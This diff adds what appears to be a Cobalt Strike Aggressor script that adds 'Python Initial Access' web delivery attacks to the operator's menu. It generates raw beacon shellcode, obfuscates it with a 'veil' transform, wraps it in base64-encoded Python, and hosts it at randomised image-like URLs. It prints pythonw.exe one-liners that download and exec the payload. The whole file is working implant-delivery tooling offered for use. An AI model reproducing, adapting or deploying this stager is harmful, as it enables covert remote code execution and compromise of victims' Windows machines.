@@ -1,0 +1,116 @@
+sub generate_random_url {
+	$path_list = @("img", "imgs", "data", "dev");
+	$ext_list = @("html", "gif", "png", "jpg");
+
+	$path = $path_list[int(rand() * size($path_list))];
+	$c0 = chr(int(rand() * 26) + 97);
+	$c1 = chr(int(rand() * 26) + 97);
+	$c2 = chr(int(rand() * 26) + 97);
+	$ext = $ext_list[int(rand() * size($ext_list))];
+
+	return "/" . $path . "/" . $c0 . $c1 . $c2 . "." . $ext;
+}
+
+sub python_script {
+	local('$shellcode_32 $shellcode_64 $arch $handle $data');
+	$shellcode_32 = $1;
+	$shellcode_64 = $2;
+
+	# read in the resource from the current folder
+	# https://gist.github.com/peewpw/8054a64eb4b5cd007a8431a71d698dc3
+	$handle = openf(script_resource("template.py"));
+	$data   = readb($handle, -1);
+	closef($handle);
+	
+	return strrep($data, '$$CODE32$$', transform($shellcode_32, "veil"), '$$CODE64$$', transform($shellcode_64, "veil"));
+}
+
+# reduce the size of a Python script. (or not)
+# $1 = the script to compress...
+sub python_compress {
+    return "import base64;exec(base64.b64decode(\"" . base64_encode($1) . "\"))";
+}
+
+sub setup_python2_attack {
+    local('%options $url $shellcode $script $python_path');
+    %options = $3;
+
+    # generate our stageless python payload
+    $shellcode_32 = artifact_payload(%options["listener"], "raw", "x86");
+    $shellcode_64 = artifact_payload(%options["listener"], "raw", "x64");
+	$script = python_script($shellcode_32, $shellcode_64);
+    $script = python_compress($script);
+
+    # host the script!
+    $url = site_host(%options["host"], %options["port"], %options["uri"], $script, "text/plain", "Scripted Web Delivery (python 2/3) ");
+
+    # tell the user our URL
+    $python_path = "c:\\Python27\\pythonw.exe";
+    prompt_text("One-liner: ",$python_path." -c \"import urllib;exec(urllib.urlopen(' $+ $url $+ ').read());\"", {});
+}
+
+sub setup_python3_attack {
+    local('%options $url $shellcode $script $python_path');
+    %options = $3;
+
+    # generate our stageless python payload
+    $shellcode_32 = artifact_payload(%options["listener"], "raw", "x86");
+    $shellcode_64 = artifact_payload(%options["listener"], "raw", "x64");
+    $script = python_script($shellcode_32, $shellcode_64);
+    $script = python_compress($script);
+
+    # host the script!
+    $url = site_host(%options["host"], %options["port"], %options["uri"], $script, "text/plain", "Scripted Web Delivery (python 2/3) ");
+
+    # tell the user our URL
+    #$python_path = "C:\\Users\\user\\AppData\\Local\\Programs\\Python\\Python39\\python.exe";
+    $python_path = "C:\\Python39\\pythonw.exe";    
+    prompt_text("One-liner: ",$python_path." -c \"import urllib.request;exec(urllib.request.urlopen(' $+ $url $+ ').read());\"", {});
+}
+
+# create a popup menu!
+popup attacks {
+	menu "Python Initial Access" {
+		item "Python 2 Web Delivery" {
+			local('$dialog %defaults');
+
+			# setup our defaults
+			%defaults["uri"]  = generate_random_url();
+			%defaults["host"] = localip();
+			%defaults["port"] = 80;
+
+			# create our dialog
+			$dialog = dialog("Python3 Web Delivery (Stageless)", %defaults, &setup_python2_attack);
+			dialog_description($dialog, "A stageless version of the Python 2 Web Delivery attack.");
+			drow_text($dialog, "uri", "URI Path: ", 20);
+			drow_text($dialog, "host", "Local Host: ");
+			drow_text($dialog, "port", "Local Port: ");
+			drow_listener_stage($dialog, "listener", "Listener: ");
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+
+		item "Python 3 Web Delivery" {
+			local('$dialog %defaults');
+
+			# setup our defaults
+			%defaults["uri"]  = generate_random_url();
+			%defaults["host"] = localip();
+			%defaults["port"] = 80;
+
+			# create our dialog
+			$dialog = dialog("Python3 Web Delivery (Stageless)", %defaults, &setup_python3_attack);
+			dialog_description($dialog, "A stageless version of the Python 3 Web Delivery attack.");
+			drow_text($dialog, "uri", "URI Path: ", 20);
+			drow_text($dialog, "host", "Local Host: ");
+			drow_text($dialog, "port", "Local Port: ");
+			drow_listener_stage($dialog, "listener", "Listener: ");
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+	}
+}
